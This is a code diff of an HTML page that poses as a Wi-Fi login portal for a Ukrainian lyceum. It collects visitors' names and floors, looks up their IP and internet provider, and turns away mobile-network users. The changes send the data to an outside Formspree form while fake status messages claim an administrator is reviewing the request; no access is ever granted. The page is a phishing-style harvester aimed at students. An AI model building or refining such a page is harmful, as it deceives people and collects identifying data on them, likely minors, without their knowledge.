@@ -111,6 +111,7 @@
     <div id="auth-form">
         <span class="header-label">Отримати доступ до інтернету</span>
         <h1>Ліцей №169</h1>
+        
         <div class="form-group">
             <label>Локація:</label>
             <select id="floor">
@@ -119,10 +120,12 @@
                 <option value="3">Третій поверх</option>
             </select>
         </div>
+
         <div class="form-group">
             <label>Прізвище та ім'я:</label>
             <input type="text" id="username" placeholder="Введіть ваші дані">
         </div>
+
         <button onclick="processLogin()">Увійти</button>
     </div>
 
@@ -135,7 +138,7 @@
 </div>
 
 <script>
-    // ПЕРЕВІРКА ПРИ ЗАВАНТАЖЕННІ
+    // Перевірка при завантаженні: якщо вже "ввійшли", показуємо лоадер
     window.onload = function() {
         if (localStorage.getItem('accessRequested') === 'true') {
             showWaitingScreen();
@@ -157,53 +160,63 @@
             return;
         }
 
-        // Зберігаємо стан в LocalStorage
-        localStorage.setItem('accessRequested', 'true');
-        localStorage.setItem('userName', name);
-        
-        showWaitingScreen();
-
         try {
-            const ipRes = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipRes.json();
-            const userIp = ipData.ip;
+            // Перевірка типу підключення через API
+            const ipRes = await fetch('http://ip-api.com/json/');
+            const data = await ipRes.json();
+            
+            const isp = data.isp.toLowerCase();
+            const org = (data.org || "").toLowerCase();
+            const mobileOperators = ['kyivstar', 'vodafone', 'lifecell', 'mts', 'intertelecom'];
+            
+            // Блокування, якщо це мобільний інет/хотспот
+            const isMobile = mobileOperators.some(op => isp.includes(op) || org.includes(op));
 
-            console.log("%c--- ДАНІ ЗАПИТУ ---", "color: #2563eb; font-weight: bold;");
-            console.log(`Об'єкт: ${name}, Поверх: ${floor}, IP: ${userIp}`);
+            if (isMobile) {
+                alert("Помилка підключення: Виявлено використання мобільного інтернету або точки доступу. Будь ласка, підключіться до мережі Wi-Fi ліцею.");
+                return;
+            }
 
+            // Якщо пройшов перевірку — зберігаємо стан та відправляємо дані
+            localStorage.setItem('accessRequested', 'true');
+            showWaitingScreen();
+
+            // Вивід в консоль (для тебе)
+            console.log(`Користувач: ${name}, IP: ${data.query}, Провайдер: ${data.isp}`);
+
+            // Відправка на Formspree
             await fetch('https://formspree.io/f/xrerlvaj', {
                 method: 'POST',
                 headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     "Користувач": name,
-                    "Локація": floor + " поверх",
-                    "IP": userIp,
-                    "Статус": "Очікує підтвердження"
+                    "Поверх": floor,
+                    "IP": data.query,
+                    "Провайдер": data.isp,
+                    "Час": new Date().toLocaleString()
                 })
             });
+
         } catch (err) {
-            console.log("Помилка фонової обробки.");
+            alert("Помилка сервера авторизації. Перевірте підключення до інтернету.");
         }
     }
 
     function startStatusRotation() {
         const statuses = [
-            "З'єднання зі шлюзом...",
-            "Синхронізація з сервером ліцею...",
-            "Запит розглядається адміністратором...",
-            "Перевірка безпеки з'єднання...",
-            "Очікування підтвердження доступу..."
+            "Синхронізація зі шлюзом...",
+            "Запит надіслано адміністратору мережі",
+            "Очікування підтвердження доступу...",
+            "Перевірка облікового запису...",
+            "Оновлення сертифікатів безпеки..."
         ];
         
         let i = 0;
         const statusEl = document.getElementById('dynamic-status');
-        const interval = setInterval(() => {
+        setInterval(() => {
             if (i < statuses.length) {
                 statusEl.innerText = statuses[i];
                 i++;
-            } else {
-                statusEl.innerText = statuses[statuses.length - 1];
-                clearInterval(interval);
             }
         }, 4000);
     }
@@ -211,3 +224,4 @@
 
 </body>
 </html>
+
